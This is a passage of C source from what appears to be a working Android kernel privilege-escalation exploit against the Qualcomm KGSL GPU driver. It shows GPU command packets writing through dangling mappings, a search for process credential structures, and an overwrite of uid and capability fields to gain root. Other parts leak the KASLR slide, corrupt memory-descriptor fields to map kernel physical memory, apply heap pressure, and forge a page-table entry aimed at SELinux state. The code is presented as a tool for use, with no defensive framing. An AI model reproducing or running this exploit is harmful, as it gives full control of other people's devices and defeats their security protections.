                                       PAGE_OFF - nxi;
                        if (M_pair_candidate >= LOW_BASE) continue;
                        if (M_pair_candidate & 0x3FFFFFFFULL) continue;   /* 1GB-aligned memstart_addr */
                        int found = 0;
                        for (int v = 0; v < adj_vote_kinds; v++)
                            if (adj_vote_val[v] == M_pair_candidate) { adj_vote_cnt[v]++; found = 1; break; }
                        if (!found && adj_vote_kinds < ADJ_VOTE_MAX_VALUES) {
                            adj_vote_val[adj_vote_kinds] = M_pair_candidate; adj_vote_cnt[adj_vote_kinds] = 1; adj_vote_kinds++;
                        }
                    }
                }
                for (int v = 0; v < adj_vote_kinds; v++)
                    if (adj_vote_cnt[v] > adj_vote_best_count) {
                        adj_vote_best_count = adj_vote_cnt[v]; M_adj_vote = adj_vote_val[v];
                    }
                L("[M-ADJ-VOTE] M=0x%llx votes=%d/%d candidates\n",
                  (unsigned long long)M_adj_vote, adj_vote_best_count, n_cand);
                log_fsync();
            }

            /* Patch candidates one at a time; the pointer swap above confirmed nothing.
               M is resolved in five tiers: early-image anchor, k enumeration
               (421 x 14, needs 6 hops), adjacency vote (>= 3 votes), cred VA
               intersection (>= 4 contributing candidates, score >= 3), six-value brute
               force (score >= 3). A candidate with no M is skipped. */
            /* rooted is a one-way latch: set, never cleared. */
            for (int ci = 0; ci < n_cand && !rooted; ci++) {
                uint64_t task_pa = cand_pa[ci];
                uint64_t next_va = 0;
                if (sigsetjmp(jmpbuf, 1) == 0) {
                    jmp_armed = 1;
                    next_va = *(volatile uint64_t *)
                        (lb + (task_pa - LOW_BASE) + OFF_TASKS);
                    jmp_armed = 0;
                } else { jmp_armed = 0; continue; }
                /* Enumerate M = LOW_BASE - (k << 30) and walk the task list from this
                   candidate. A k survives only after six hops with a printable comm byte
                   at every neighbour; a one-way eight-hop walk accepted the wrong k
                   about 43% of the time. */
                uint64_t M = 0; int M_solved = 0;
                if (M_known) {   /* An anchor is known; skip the 421 x 14 enumeration. */
                    M = M_known; M_solved = 1;
                }
                for (int k = 0; k <= 420 && !M_solved; k++) {
                    uint64_t M_candidate_k = LOW_BASE - ((uint64_t)k << 30);
                    int chain_ok = 1, hops = 0;
                    uint64_t walk = task_pa;
                    uint64_t prev_pa = 0;   /* previous node in the walk */
                    int have_prev = 0;
                    for (int stp = 0; stp < 14 && chain_ok; stp++) {
                        volatile uint8_t *tp = lb + (walk - LOW_BASE);
                        uint64_t nx = 0, pv = 0;
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            nx = *(volatile uint64_t *)(tp + OFF_TASKS);
                            pv = *(volatile uint64_t *)(tp + OFF_TASKS + 8);
                            jmp_armed = 0;
                        } else { jmp_armed = 0; chain_ok = 0; break; }
                        if (stp < 3 && k < 3 && ci == 0)
                            L("[M-K-WALK] ci=%d k=%d stp=%d walk=%llx nx=%llx pv=%llx\n",
                              ci, k, stp, (unsigned long long)walk,
                              (unsigned long long)nx, (unsigned long long)pv);
                        /* Reaching init_task.tasks is a legitimate end: init_task sits in the image
                           region, outside the linear-map window, so rejecting the walk there
                           would make the six-hop rule unreachable. */
                        if (nx >= 0xFFFFFFC000000000ULL) break;
                        /* nx is the neighbour's tasks member VA; subtract OFF_TASKS for the
                           task_struct base. */
                        uint64_t npa = nx - (uint64_t)OFF_TASKS -
                            PAGE_OFF + M_candidate_k;
                        if (npa < LOW_BASE || npa >= LOW_BASE + LOW_SIZE) {
                            chain_ok = 0; break;
                        }
                        volatile uint8_t *np = lb + (npa - LOW_BASE);
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            uint8_t c0 = np[OFF_COMM];
                            if (!(c0 >= 0x20 && c0 < 0x7f)) chain_ok = 0;
                            jmp_armed = 0;
                        } else { jmp_armed = 0; chain_ok = 0; break; }
                        prev_pa = walk; have_prev = 1;
                        hops++;
                        walk = npa;
                    }
                    if (chain_ok && hops >= 6) { M = M_candidate_k; M_solved = 1; }
                }
                if (!M_solved && adj_vote_best_count >= 3) { M = M_adj_vote; M_solved = 1;
                    L("[ROOT] cand#%d using the voted M\n", ci); }
                /* Recover M from cred VAs: with PA_cred in [LOW_BASE, SWEEP_HI_CAP) and
                   r = PA_cred - M, M is in [max(LOW_BASE - r, 0), SWEEP_HI_CAP-1 - r].
                   Fewer than 4 contributing candidates gives up. Otherwise each 1GB-aligned
                   value in the interval is scored by the uid and sgid of the first 10
                   candidates, stopping at a score of 3. */
                if (!M_solved && n_cand >= 6) {
                    uint64_t lo = 0, hi = LOW_BASE;
                    int used = 0;
                    for (int i2 = 0; i2 < n_cand; i2++) {
                        uint64_t cva = 0;
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            cva = *(volatile uint64_t *)
                                (lb + (cand_pa[i2] - LOW_BASE) + OFF_CRED);
                            jmp_armed = 0;
                        } else { jmp_armed = 0; continue; }
                        if ((cva >> 48) != 0xffffu || cva < PAGE_OFF)
                            continue;
                        uint64_t r = cva - PAGE_OFF;   /* = PA_cred - M */
                        if (r >= SWEEP_HI_CAP) continue;   /* empty interval */
                        /* PA_cred = r + M in [LOW_BASE, SWEEP_HI_CAP) puts M in
                           [LOW_BASE - r, SWEEP_HI_CAP - 1 - r]; no 4GB prefilter.
                           The cred PA is guarded by LOW_SIZE, the mmap length. */
                        uint64_t l_i = (LOW_BASE > r) ? (LOW_BASE - r) : 0;
                        uint64_t h_i = SWEEP_HI_CAP - 1 - r;
                        if (l_i > lo) lo = l_i;
                        if (used == 0 || h_i < hi) hi = h_i;
                        used++;
                    }
                    L("[M-CRED-INTERVAL] intersection M in [0x%llx,0x%llx] used=%d\n",
                      (unsigned long long)lo, (unsigned long long)hi, used);
                    if (used >= 4 && hi >= lo) {
                        int best2 = 0; uint64_t best_M_candidate = 0;
                        for (uint64_t M_candidate = ((lo + 0x3FFFFFFFULL) &
                                            ~0x3FFFFFFFULL);
                             M_candidate <= hi && best2 < 3;
                             M_candidate += 0x40000000ULL) {
                            int sc = 0;
                            for (int i2 = 0; i2 < n_cand && i2 < 10; i2++) {
                                uint64_t cva = 0, cpa;
                                if (sigsetjmp(jmpbuf, 1) == 0) {
                                    jmp_armed = 1;
                                    cva = *(volatile uint64_t *)
                                        (lb + (cand_pa[i2]-LOW_BASE)+OFF_CRED);
                                    jmp_armed = 0;
                                } else { jmp_armed = 0; break; }
                                cpa = cva - PAGE_OFF + M_candidate;
                                if (cpa < LOW_BASE ||
                                    cpa >= LOW_BASE + LOW_SIZE)
                                    continue;
                                volatile uint8_t *cc =
                                    lb + (cpa - LOW_BASE);
                                uint32_t u1 = 0, g1 = 0;
                                if (sigsetjmp(jmpbuf, 1) == 0) {
                                    jmp_armed = 1;
                                    u1 = *(volatile uint32_t *)(cc + 4);
                                    g1 = *(volatile uint32_t *)(cc + 16);
                                    jmp_armed = 0;
                                } else { jmp_armed = 0; continue; }
                                if (u1 == 2000 && g1 == 2000) sc++;
                            }
                            L("[M-CRED-INTERVAL] M=0x%llx score=%d\n",
                              (unsigned long long)M_candidate, sc);
                            log_fsync();
                            if (sc > best2) { best2 = sc; best_M_candidate = M_candidate; }
                        }
                        if (best2 >= 3) {
                            M = best_M_candidate; M_solved = 1;
                            L("[ROOT] cand#%d IVX M=0x%llx score=%d\n",
                              ci, (unsigned long long)M, best2);
                            log_fsync();
                        }
                    }
                }

                /* Read-validated M over a small fixed set: the candidate cred VAs are known,
                   so each M_candidate_k yields a cred PA whose uid and sgid are read and scored.
                   Read-only throughout, so a wrong M costs nothing; three agreeing
                   candidates lock it in. */
                if (!M_solved) {
                    #define FIXED_M_CAND_COUNT 6
                    static const uint64_t fixed_M_candidates[FIXED_M_CAND_COUNT] = {
                        0x40000000ULL, 0ULL, LOW_BASE,
                        0x20000000ULL, 0x60000000ULL, 0xC0000000ULL };
                    int best = 0; uint64_t best_M_candidate = 0;
                    for (int ki = 0; ki < FIXED_M_CAND_COUNT; ki++) {
                        uint64_t M_candidate = fixed_M_candidates[ki];
                        if (M_candidate >= LOW_BASE) continue;
                        int sc = 0;
                        for (int i2 = 0; i2 < n_cand && i2 < 8; i2++) {
                            uint64_t cva = 0;
                            if (sigsetjmp(jmpbuf, 1) == 0) {
                                jmp_armed = 1;
                                cva = *(volatile uint64_t *)
                                    (lb + (cand_pa[i2] - LOW_BASE) + OFF_CRED);
                                jmp_armed = 0;
                            } else { jmp_armed = 0; break; }
                            if ((cva >> 48) != 0xffffu) continue;
                            uint64_t cpa = cva - PAGE_OFF + M_candidate;
                            if (cpa < LOW_BASE || cpa >= LOW_BASE + LOW_SIZE)
                                continue;
                            volatile uint8_t *cc = lb + (cpa - LOW_BASE);
                            uint32_t u1 = 0, g1 = 0;
                            if (sigsetjmp(jmpbuf, 1) == 0) {
                                jmp_armed = 1;
                                u1 = *(volatile uint32_t *)(cc + 4);
                                g1 = *(volatile uint32_t *)(cc + 16);
                                jmp_armed = 0;
                            } else { jmp_armed = 0; continue; }
                            if (u1 == 2000 && g1 == 2000) sc++;
                        }
                        L("[M-CRED-FIXED] M=0x%llx score=%d\n",
                          (unsigned long long)M_candidate, sc);
                        log_fsync();
                        if (sc > best) { best = sc; best_M_candidate = M_candidate; }
                    }
                    if (best >= 3) { M = best_M_candidate; M_solved = 1;
                        L("[ROOT] cand#%d read-validated M=0x%llx (score=%d)\n",
                          ci, (unsigned long long)M, best);
                        log_fsync(); }
                }
                if (!M_solved) { L("[ROOT] cand#%d M solve failed (one-way chain cannot reach 6 hops)\n", ci); log_fsync(); continue; }
                L("[+] M solved M=0x%llx (one-way chain reached 6 hops)\n", (unsigned long long)M);
                uint64_t cred_va = 0;
                if (sigsetjmp(jmpbuf, 1) == 0) {
                    jmp_armed = 1;
                    cred_va = *(volatile uint64_t *)
                        (lb + (task_pa - LOW_BASE) + OFF_CRED);
                    jmp_armed = 0;
                } else { jmp_armed = 0; continue; }
                uint64_t cred_pa = cred_va - PAGE_OFF + M;
                volatile uint8_t *cr = NULL;
                if (cred_pa >= LOW_BASE && cred_pa < LOW_BASE + LOW_SIZE)
                    cr = lb + (cred_pa - LOW_BASE);
                int g_ok = cr && (cred_va >> 48) == 0xffffu &&
                    *(volatile uint32_t *)(cr + 4) == 2000 &&
                    *(volatile uint32_t *)(cr + 16) == 2000;
                L("[ROOT] cand#%d cred_pa=%llx uid=%u gate=%d\n",
                  ci, (unsigned long long)cred_pa,
                  cr ? *(volatile uint32_t *)(cr + 4) : 0xEEEEEEEEu, g_ok);
                log_fsync();
                if (!mode_root || !g_ok) continue;
                if (sigsetjmp(jmpbuf, 1) == 0) {
                    jmp_armed = 1;
                    for (int i = 0; i < 9; i++)
                        *(volatile uint32_t *)(cr + 4 + i * 4) = 0;
                    for (int i = 0; i < 5; i++)
                        *(volatile uint64_t *)(cr + 40 + i * 8) =
                            0x0000003FFFFFFFFFULL;
                    *(volatile uint64_t *)(cr + 72) = 0x0000003FFFFFFFFFULL;
                    jmp_armed = 0;
                    L("[ROOT] cred overwritten (cand#%d)\n", ci);
                } else {
                    jmp_armed = 0;
                    L("[!] cred write faulted; next candidate\n");
                    log_fsync();
                    continue;
                }
                log_fsync();
                usleep(50 * 1000);
                long uid_now = (long)getuid();
                L("[%s] getuid()=%ld %s\n", "ROOT", uid_now,
                  uid_now == 0 ? "same-process immediate ROOT" : "(this candidate is not the main process)");
                if (uid_now == 0) { rooted = 1; }
                if (!rooted && cand_idx[ci] >= 0) {
                    int cf = burn_confirm(cand_idx[ci], 400);
                    L("[BURN] burn%02d confirm=%d %s\n", cand_idx[ci], cf,
                      cf == 1 ? "child is root; sh -i takes over adb" : "");
                    log_fsync();
                    if (cf == 1) rooted = 1;
                }
            }
            {
                system("id > /data/local/tmp/rootproof.txt 2>&1");
                FILE *pf2 = fopen("/data/local/tmp/rootproof.txt", "r");
                if (pf2) {
                    char line[256];
                    while (fgets(line, sizeof(line), pf2))
                        L("[ROOT-PROOF] %s", line);
                    fclose(pf2);
                }
            }
            /* Final getuid() recheck: the parent itself may become root after its own
               per-candidate check ran, so without this a live root reads as a failure. */
            if (!rooted && getuid() == 0) {
                rooted = 1;
                L("[ROOT-CONFIRMED getuid()==0]\n");
                log_fsync();
            }
            if (!rooted)
                L("[!] all candidates patched and still not root; pausing to keep the device\n");
            else
                L("[+] ROOTED; pausing to keep the device (root state retained)\n");
            log_fsync();
            uaf_pause();
        }
    }
    phaseb_jump:
    if (argc > 4 && strcmp(argv[4], "p2diag") == 0) {
        int nr = probe_hits < 8 ? probe_hits : 8;
        struct gpu_ctx_t dg = {0};
        int dg_ready = (setup_ib(&dg) == 0);
        L("[+] p2diag: reading at most %d hit memdescs, P3/P4/P5 disabled\n", nr);
        for (int hi = 0; hi < nr; hi++) {
            uint64_t ep = DANGLING_BASE + ((uint64_t)hit_pages[hi] << 12) +
                (uint64_t)hit_slots[hi] * 512;
            struct gpu_ctx_t *rg = dg_ready ? &dg : &g;
            if (gpu_read_memdesc(rg, ep, dst_id, dst_u, dst_g, "P2DIAG") != 0) {
                /* A stale mapping may permit CP_MEM_WRITE but fault on a bulk
                   CP_MEMCPY. Probe each dword independently to distinguish a
                   read-permission fault from a packet/buffer problem. */
                static const uint32_t offs[] = {0x28,0x2c,0x30,0x34,0x48,0x4c,0x50,0x54};
                uint32_t words[8] = {0};
                int ok[8] = {0};
                L("[D] p2diag id=%u bulk read failed errno=%d; per-field probes\n",
                  hit_ids[hi], errno);
                for (int k = 0; k < 8; k++) {
                    if (dg_ready) rebuild_ctx_empty(&dg);
                    ok[k] = gpu_read_one(rg, ep, dst_id, dst_u, dst_g,
                                         offs[k], 0x3000 + (uint32_t)k * 4,
                                         &words[k], "P2DIAG-ONE") == 0;
                }
                if (ok[4] && ok[5]) {
                    diag_ops = (uint64_t)words[5] << 32 | words[4];
                    if (!runtime_kaslr_valid && derive_runtime_kernel_addrs(diag_ops) != 0)
                        L("[!] p2diag id=%u ops is not a usable kernel pointer\n", hit_ids[hi]);
                }
                L("[D] p2diag CP_MEMCPY fields ok=%d%d%d%d%d%d%d%d\n",
                  ok[0],ok[1],ok[2],ok[3],ok[4],ok[5],ok[6],ok[7]);
                if (!(ok[4] && ok[5])) {
                    int ok2[8] = {0};
                    L("[D] p2diag alternate CP_MEM_TO_MEM probes\n");
                    for (int k = 0; k < 8; k++) {
                        if (dg_ready) rebuild_ctx_empty(&dg);
                        ok2[k] = gpu_read_one_m2m(rg, ep, dst_id, dst_u, dst_g,
                                                  offs[k], 0x3800 + (uint32_t)k * 4,
                                                  &words[k], "P2DIAG-M2M") == 0;
                    }
                    if (ok2[4] && ok2[5]) {
                        diag_ops = (uint64_t)words[5] << 32 | words[4];
                        if (!runtime_kaslr_valid && derive_runtime_kernel_addrs(diag_ops) != 0)
                            L("[!] p2diag M2M ops is not a usable kernel pointer\n");
                    }
                    L("[D] p2diag CP_MEM_TO_MEM fields ok=%d%d%d%d%d%d%d%d\n",
                      ok2[0],ok2[1],ok2[2],ok2[3],ok2[4],ok2[5],ok2[6],ok2[7]);
                }
                break;
            }
            if (!runtime_kaslr_valid && derive_runtime_kernel_addrs(diag_ops) != 0)
                L("[!] p2diag id=%u ops is not a usable kernel pointer; refusing to derive KASLR\n", hit_ids[hi]);
        }
        log_fsync();
        uaf_pause();
    }

    if (argc > 4 && strcmp(argv[4], "p2only") == 0) {
        L("[+] p2only: save P2 evidence then pause (no P3/P4/P5)\n");
        log_fsync();
        uaf_pause();
    }

    /* bigmmap writes only memdesc size@+0x30 = 0x40000000, touching neither ops,
       flags nor pages, and does not mmap here: the landing is verified by reading the
       size back. The 1 GiB mmap gate sits after ops lands; eight mmap+munmap pairs
       before that point reboot the device. */
    if (argc > 4 && strcmp(argv[4], "bigmmap") == 0) {
        L("=== bigmmap: size-only write + 1GB mmap verification (diag-only) ===\n");
        log_fsync();
        int n_big = probe_hits < 8 ? probe_hits : 8;
        int bm_ok = 0, bm_erange = 0, bm_other = 0;
        #define BM_RETRIES 4
        int land_count[8] = {0};
        for (int hi = 0; hi < n_big; hi++) {
            uint64_t ep = DANGLING_BASE + ((uint64_t)hit_pages[hi] << 12) +
                (uint64_t)hit_slots[hi] * 512;
            for (int ry = 0; ry < BM_RETRIES; ry++) {
                uint32_t ib[32];
                uint32_t len = 0;
                len += cp_nop(&ib[len], 0x0);
                len += cp_mem_write64(&ib[len], ep + 0x30, 0x40000000ULL);
                len += cp_wait_mem_writes(&ib[len]);
                len += cp_nop(&ib[len], 0x0);
                WD_START(20);
                int r = submit_ib(&g, ib, len);
                WD_STOP();
                if (r != 0) { L("[!] best_M_candidate retry %d fault errno=%d\n", ry, errno); rebuild_ctx(&g); usleep(200*1000); continue; }
                uint64_t szchk = 0;
                if (gpuobj_info_size(hit_ids[hi], &szchk) == 0 && szchk == 0x40000000ULL) {
                    land_count[hi]++;
                    break;
                }
                usleep(150 * 1000);
            }
            L("[D] best_M_candidate id=%u page=%d landings=%d/%d\n",
              hit_ids[hi], hit_pages[hi], land_count[hi], 1);
            log_fsync();
        }
        /* Order matters: the ops probe below also maps 1 GiB and retries up to 8x6
           times, a dose with no verified-safe value, so mapping before the size
           field is known good spends the whole retry budget on a probe that
           cannot succeed. */
        /* Conditional ops probe: only entries whose size landed get the low word of
           memdesc.ops written, and with 0x1215d308 (contiguous ops), not the pool ops
           value 0x1215d3a8 that sits 0xa0 away; the high word is left alone. From round
           4 on, +0x2c is written as well, as a separate group of bits. The probe is
           a 1 GiB mmap, not 4 KiB, so ERANGE is only a candidate signal. */
        int ops_landed_global = 0;
        {
            for (int hi = 0; hi < n_big; hi++) {
                if (!land_count[hi]) continue;
                uint64_t ep = DANGLING_BASE + ((uint64_t)hit_pages[hi] << 12) +
                    (uint64_t)hit_slots[hi] * 512;
                for (int ry = 0; ry < 6 && !ops_landed_global; ry++) {
                    /* Two stages: rounds 0-3 write only ops@+0x48, later rounds add
                       offset +0x2c. Batching both into one submission is lethal; the
                       split that survives is at the second round, not the fourth. */
                    uint32_t ib[64];
                    uint32_t len = 0;
                    len += cp_nop(&ib[len], 0x0);
                    if (ry < 4) {
                        len += cp_mem_write(&ib[len], ep + 0x48,
                            (uint32_t)(STATIC_OPS_ADDR & 0xffffffffULL));
                    } else {
                        len += cp_mem_write(&ib[len], ep + 0x48,
                            (uint32_t)(STATIC_OPS_ADDR & 0xffffffffULL));
                        len += cp_mem_write(&ib[len], ep + 0x2c, 0x0);
                    }
                    len += cp_wait_mem_writes(&ib[len]);
                    len += cp_nop(&ib[len], 0x0);
                    WD_START(20);
                    int r = submit_ib(&g, ib, len);
                    WD_STOP();
                    if (r != 0) { L("[!] ops write fault errno=%d\n", errno); rebuild_ctx(&g); usleep(200*1000); continue; }
                    usleep(300 * 1000);
                    errno = 0;
                    void *pp = mmap(NULL, 0x40000000ULL, PROT_READ | PROT_WRITE, MAP_SHARED,
                        kgsl_fd, ((off_t)hit_ids[hi]) << 12);
                    if (pp != MAP_FAILED) {
                        uint32_t v0 = *(volatile uint32_t *)pp;
                        munmap(pp, 0x40000000ULL);
                        /* Proof is reading back the first u32 of the kernel image
                           (0x91005a4d). Neither a successful mmap nor ERANGE proves it. */
                        L("[+] ops-PROBE id=%u mmap OK map[0]=0x%08x%s\n",
                          hit_ids[hi], v0,
                          v0 == 0x91005a4d ? " <- kernel magic!! arbitrary physical read confirmed!" : "");
                        log_fsync();
                        ops_landed_global++;
                    } else if (errno == ERANGE) {
                        L("[+] OPS-LANDED id=%u page=%d retry=%d; ERANGE=ops deref passed!\n",
                          hit_ids[hi], hit_pages[hi], ry);
                        log_fsync();
                        ops_landed_global++;
                    } else {
                        L("[D] ops-probe id=%u retry=%d errno=%d\n", hit_ids[hi], ry, errno);
                    }
                    log_fsync();
                }
                if (ops_landed_global) break;
            }
            L("[+] ops probe done: landed=%d\n", ops_landed_global);
        }
        log_fsync();
        /* The 1 GiB mmap runs only once ops has landed: only then is the entry
           contiguous with size = 1 GiB and ops pointing at STATIC_OPS_ADDR. A
           successful map here completes the prologue. */
        if (ops_landed_global) {
            for (int hi = 0; hi < n_big && hi < 3; hi++) {
                if (!land_count[hi]) continue;
                errno = 0;
                void *p1g = mmap(NULL, 0x40000000ULL, PROT_READ | PROT_WRITE, MAP_SHARED,
                    kgsl_fd, ((off_t)hit_ids[hi]) << 12);
                if (p1g != MAP_FAILED) {
                    uint32_t v0 = *(volatile uint32_t *)p1g;
                    L("[+] [A] mmap(1GB) SUCCESS id=%u map[0]=0x%08x%s\n",
                      hit_ids[hi], v0,
                      v0 == 0x91005a4d ? " <- kernel magic!!" : "");
                    munmap(p1g, 0x40000000ULL);
                } else {
                    L("[D] [A] mmap id=%u errno=%d\n", hit_ids[hi], errno);
                }
                log_fsync();
            }
        }
    }

    /* oobprobe: L1 out-of-bounds read prototype. Requires size@+0x30 to have been
       written to 1 GiB by the bigmmap mode; this mode never writes size, so run it
       after bigmmap or the map below has nothing to map.
       Only pages[1] (offset 0x1000) is touched, the most predictable out-of-bounds
       position: the neighbouring kmalloc-8 slot. The 8 bytes read count as a hit
       only if they match a known pages[] pointer, not for looking like a pointer.
       The touch is irreversible: under PANIC_ON_OOPS it either works or reboots. */
    if (argc > 4 && strcmp(argv[4], "oobprobe") == 0) {

        /* SLIDE LEAK: M2M-read memdesc.ops@+0x48 from each hit and subtract the
           static pool_ops value; the slide is what lets the rest of the chain address
           real symbols instead of guessing. The subtraction is a raw 32-bit
           difference with no 0x1fffff alignment check and runtime_kaslr_valid left
           unset, so the delta is a candidate, not a usable slide. */
        {
            struct gpu_ctx_t sl_g = {0};
            uint64_t first_ops = 0;
            if (setup_ib(&sl_g) == 0) {
                L("[*] SLIDE LEAK: M2M reading ops of %d hit entries...\n",
                  probe_hits < 16 ? probe_hits : 16);
                log_fsync();
                for (int hi = 0; hi < probe_hits && hi < 16; hi++) {
                    uint64_t entry_base = DANGLING_BASE + ((uint64_t)hit_pages[hi] << 12) +
                        (uint64_t)hit_slots[hi] * 512;
                    gpu_read_one_m2m(&sl_g, entry_base, dst_id, dst_u, dst_g,
                        0x48, 0x5000 + (uint32_t)hi * 4, NULL, "SLIDE");
                    
                    volatile uint32_t *pv = (volatile uint32_t *)((char *)dst_u + 0x5000 + hi*4);
                    uint32_t ops_lo = *pv;
                    if (ops_lo != 0xD00DFEEDu && ops_lo != 0) {
                        L("[+] SLIDE[%d]=0x%08x\n", hi, ops_lo);
                        if (first_ops == 0) first_ops = ops_lo;
                    }
                }
                
                if (first_ops) {
                    /* 0x1215d3a8 is kgsl_pool_ops, the base subtracted here;
                       STATIC_OPS_ADDR (0x1215d308) is the contiguous ops table, 0xa0
                       away. They are not interchangeable: the corruption path writes
                       d308 into ops@+0x48, and the wrong one corrupts the memdesc. */
                    uint32_t static_lo = 0x1215d3a8u;   /* kgsl_pool_ops (NOT contiguous!) */
                    if (first_ops != static_lo) {
                        uint32_t delta = first_ops - static_lo;
                        L("[+] KASLR slide detected! delta=0x%08x\n", delta);
                    } else {
                        L("[+] ops matches STATIC (slide=0?)\n");
                    }
                }
                log_fsync();
            }
        }

        /* Page-table hijack: A = UNMOVABLE pressure (the first block below), B = the
           marker region, C = an M2M scan for user PTE frames, D = decoding those
           PTEs, E = forging a PTE at a chosen physical page and reading it back from
           the CPU. E writes page tables and exists for diagnosis only. */
        {
            /* Consume UNMOVABLE directly. fork+mmap anon only creates MOVABLE
               pressure, which does not push the driver onto its fallback. These
               primitives drain kmalloc slab instead: pipes filled to 1 MiB each
               (F_SETPIPE_SZ) and 1 KiB datagrams over socketpairs, both of which back
               onto UNMOVABLE pages. Held without being freed, they empty the
               UNMOVABLE freelist so later allocations take MOVABLE pageblocks. On
               failure none of the immediate signals appear: setsockopt latency,
               allocstall_normal, SUnreclaim. */
            {
                #define NPIPES 600
                int (*pp)[2] = malloc(sizeof(int[2]) * NPIPES);
                int np = 0;
                if (pp) {
                    for (int i = 0; i < NPIPES; i++) {
                        if (pipe(pp[i]) != 0) break;
                        /* F_SETPIPE_SZ sets a 1 MiB capacity; the 256x4096 written
                           below fills it exactly, so the pipe stays full and blocked. */
                        if (fcntl(pp[i][0], 1031, 1048576) < 0) { close(pp[i][0]); close(pp[i][1]); continue; }

                        char buf[4096]; memset(buf, 0x50, sizeof(buf));
                        for (int w = 0; w < 256; w++) {
                            if (write(pp[i][1], buf, 4096) != 4096) break;
                        }
                        np++;
                    }
                    L("[D] STEP A pipe pressure: %d pipes x 1MB\n", np);
                    log_fsync();
                    /* Hold them: no close, no drain. */
                }
                /* SO_SNDBUF is only a cap: setsockopt allocates nothing. The real
                   consumption is each 1 KiB datagram's skb (kmalloc-256 + order-0 frag). */
                {
                    int ns = 0;
                    for (int i = 0; i < 4000; i++) {
                        int sv[2];
                        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) != 0) break;
                        int sz = 212992;
                        setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &sz, sizeof(sz));
                        setsockopt(sv[1], SOL_SOCKET, SO_SNDBUF, &sz, sizeof(sz));
                        char dgram[1024]; memset(dgram, 0x53, sizeof(dgram));
                        write(sv[0], dgram, sizeof(dgram));
                        ns += 2;
                    }
                    L("[D] P3 socket pressure: %d fds held\n", ns);
                    log_fsync();
                }
                L("[D] STEP A pressure done\n");
                log_fsync();
            }

            /* Marker region: 8 MB, cut into four 2 MB-aligned chunks and touched page
               by page. The mapping carries 2 MiB of slack because the first aligned
               boundary can consume up to 0x1FFFFF. */
            void *R = mmap(NULL, 8UL*1024*1024 + 0x200000, PROT_READ|PROT_WRITE,
                MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
            if (R == MAP_FAILED) { L("[-] R mmap FAILED\n"); uaf_pause(); }
            madvise(R, 8UL*1024*1024 + 0x200000, MADV_NOHUGEPAGE);
            uintptr_t B = ((uintptr_t)R + 0x1FFFFF) & ~0x1FFFFFUL;
            L("[D] R=%p B=%p (delta=0x%lx) align2MB=%d\n", R, (void*)B,
              (unsigned long)((uintptr_t)B - (uintptr_t)R),
              ((uintptr_t)R & 0x1FFFFF) == 0);
            for (int chunk = 0; chunk < 4; chunk++)
                for (int pi = 0; pi < 512; pi++) {
                    volatile uint32_t *pg = (volatile uint32_t *)(B + chunk*0x200000ULL + pi*4096UL);
                    *pg = 0x5A5B0000u | ((uint32_t)chunk << 12) | (uint32_t)pi;
                }
            L("[+] marker region R=%p (B=%p) tagged\n", R, (void*)B);
            log_fsync();

            /* M2M-scan the window for user PTE signature frames. */
            struct gpu_ctx_t pt_g = {0};
            int pt_frame = -1;
            if (setup_ib(&pt_g) == 0) {
                for (uint32_t pg = 0; pg < DANGLING_PAGES && pt_frame < 0; pg += 4) {
                    gpu_read_one_m2m(&pt_g, DANGLING_BASE + ((uint64_t)pg << 12),
                        dst_id, dst_u, dst_g, 0x0, 0x8000, NULL, "PTJ-SCAN");
                    volatile uint64_t *buf = (volatile uint64_t *)((char *)dst_u + 0x8000);
                    /* Signature of a user RW data PTE: bits[1:0]=11, AF (bit 10)=1,
                       dirty (bit 6)=1, bits[63:48]=0. The >>48==0 test confines
                       candidates to physical addresses below 4 GiB, which caps what
                       this scan can find. */
                    int sig = 0;
                    for (int qi = 0; qi < 128; qi++) {
                        uint64_t v = buf[qi];
                        if ((v & 3) == 3 && (v >> 48) == 0 && (v & (1ULL<<10)) && (v & (1ULL<<6)))
                            sig++;
                    }
                    if (sig >= 48) {   /* 48 of the 128 slots adopts the frame; the threshold is empirical, the actual count is logged on the next line. */
                        pt_frame = pg;
                        L("[+] PT page candidate @dangling page %u (signature %d/128)!\n", pg, sig);
                        log_fsync();
                    }
                    if ((pg & 0xFF) == 0xFF) log_fsync();
                }
            } else L("[!] PT scan ctx setup FAILED\n");

            if (pt_frame >= 0) {
                /* Read the first 8 PTEs and decode their PFNs. M2M cannot read the
                   physical frame through the dangling VA (that needs a phys->VA
                   mapping), so no marker is compared and only the number of valid
                   PTEs is reported; passing does not mean the frame was the right one. */
                uint64_t saved[8] = {0};
                int verified = 0;
                for (int k = 0; k < 8; k++) {
                    gpu_read_one_m2m(&pt_g,
                        DANGLING_BASE + ((uint64_t)pt_frame << 12) + k*8,
                        dst_id, dst_u, dst_g, 0x0, 0x4000 + k*4, NULL, "PTJ-RD");
                    volatile uint32_t *pv = (volatile uint32_t *)((char *)dst_u + 0x4000 + k*4);
                    saved[k] = *(volatile uint64_t *)((char *)dst_u + 0x4000 + k*4);
                    uint64_t pte = saved[k];
                    if ((pte & 3) != 3) continue;
                    uint64_t pfn = (pte >> 12) & 0xFFFFFFFFFULL;
                    verified++;
                }
                L("[D] STEP D: valid PTE %d/8 (PFN decode in log)\n", verified);
                for (int k = 0; k < 8; k++)
                    L("[D]   PTE[%d]=0x%016llx pfn=0x%05llx phys=0x%08llx\n",
                      k, (unsigned long long)saved[k],
                      (unsigned long long)((saved[k]>>12)&0xFFFFFFFFFULL),
                      (unsigned long long)((saved[k]>>12)&0xFFFFFFFFFULL) << 12);
                log_fsync();

                /* Diagnostic: point PTE[0] at selinux state (PA_OF(ST_SELINUX_LINK)).
                   Whether that PTE governs marker region B was never verified, so the
                   four chunks below are probed blindly. */
                L("[*] STEP E diag: forged PTE[0] -> 0x92CAC000, then scan 4 chunks...\n");
                uint64_t new_pte = 0x92CAC000ULL | (saved[0] & 0xFFF0000000000FFFULL & ~(1ULL<<6));
                /* Keep every attribute bit (PXN and UXN included) and the low 12
                   bits; swap only the PFN in bits[47:12]. saved[0] is not checked to be
                   a valid PTE either: the loop above continues past (pte & 3) != 3. */
                new_pte = (saved[0] & ~0x000FFFFFFFFFF000ULL) | 0x92CAC000ULL;
                for (int rep = 0; rep < 3; rep++) {
                    uint32_t ib[32];
                    uint32_t len = 0;
                    len += cp_nop(&ib[len], 0x0);
